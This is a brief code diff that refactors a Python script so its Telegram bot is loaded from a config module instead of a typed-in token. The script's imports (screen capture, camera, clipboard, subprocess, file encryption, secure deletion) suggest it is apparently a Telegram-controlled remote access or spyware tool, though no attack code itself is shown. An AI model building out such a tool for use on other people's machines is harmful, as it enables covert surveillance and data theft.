@@ -4,7 +4,6 @@ import mss
 import cv2
 import time
 import pyttsx3
-import telebot
 import platform
 import clipboard
 import subprocess
@@ -12,9 +11,8 @@ import pyAesCrypt
 import xml.etree.ElementTree as ET
 from secure_delete import secure_delete
 
-TOKEN = str(input("Enter your bot token: "))
+from conf import bot
 
-bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")
 secure_delete.secure_random_seed_init()
 bot.set_webhook()
